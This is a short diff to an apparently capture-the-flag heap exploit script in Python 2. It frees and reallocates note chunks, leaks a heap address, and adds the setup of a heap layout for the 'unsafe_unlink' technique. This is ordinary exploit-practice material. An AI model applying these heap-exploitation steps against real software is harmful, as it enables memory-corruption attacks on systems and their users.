@@ -74,7 +74,7 @@ if __name__ == "__main__":
     delete_note(0)
     delete_note(1)
     
-    raw_input('after free two 0xdeadbeef's...')
+    raw_input('after cleanup...')
 
     for _ in xrange(4):
         new_note(p32(0xcafebabe))
@@ -91,3 +91,20 @@ if __name__ == "__main__":
     leaked_heap = leak_heap()
     
     raw_input('after leaking heap...')
+
+    delete_note(0)
+    delete_note(1)
+    delete_note(3)
+
+    raw_input('after another cleanup...')
+
+    #
+    # building heap layout for "unsafe_unlink" technique
+    #
+    new_note('A'*0x100)
+    new_note('B'*0x100)
+    new_note('C'*0x100)
+    
+    delete_note(2)
+    delete_note(1)
+    delete_note(0)
